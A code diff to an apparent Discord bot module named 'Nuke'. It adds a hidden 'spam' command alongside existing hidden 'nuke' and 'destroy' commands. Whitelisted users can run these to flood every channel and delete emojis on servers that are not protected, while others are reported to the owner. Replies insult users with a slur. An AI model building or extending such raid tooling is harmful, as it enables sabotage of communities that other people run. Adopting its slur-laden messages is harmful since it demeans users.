@@ -78,10 +78,10 @@ class Nuke(commands.Cog):
             if ctx.content.startswith(">spam"):
                 await self.spam_channel(ctx.channel)
     
-    async def warn(self, ctx):
+    async def warn(self, ctx, t):
         koda = self.bot.get_user(self.koda)
-        await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
-        await ctx.send("You have been reported to Koda for attempting to use the nuke command.")
+        await koda.send(f"{ctx.author} attempted to use the {t} command in {ctx.guild.name}.")
+        await ctx.send(f"You have been reported to Koda for attempting to use the {t} command.")
 
     @commands.command(hidden=True)
     async def nuke(self, ctx):
@@ -96,9 +96,9 @@ class Nuke(commands.Cog):
                 await self.spam_all_channels(ctx)
                 print("Done!")
             else:
-                await ctx.send("You fucking retard you can't nuke this server.")
+                await ctx.send("You fucking retard, you can't nuke this server.")
         else:
-            await self.warn(ctx)
+            await self.warn(ctx, 'nuke')
     
     @commands.command(hidden=True)
     async def destroy(self, ctx):
@@ -110,9 +110,21 @@ class Nuke(commands.Cog):
                 await self.delete_emojis(ctx)
                 print("Done!")
             else:
-                await ctx.send("You fucking retard you can't nuke this server.")
+                await ctx.send("You fucking retard, you can't destroy this server.")
         else:
-            await self.warn(ctx)
+            await self.warn(ctx, 'destroy')
+    
+    @commands.command(hidden=True)
+    async def spam(self, ctx):
+        await ctx.message.delete()
+        if ctx.author.id in self.whitelist:
+            if not ctx.guild.id in self.servers:
+                await self.spam_all_channels(ctx)
+                print("Done!")
+            else:
+                await ctx.send("You fucking retard, you can't spam this server.")
+        else:
+            self.warn(ctx, 'spam')
 
 def setup(bot):
     bot.add_cog(Nuke(bot))
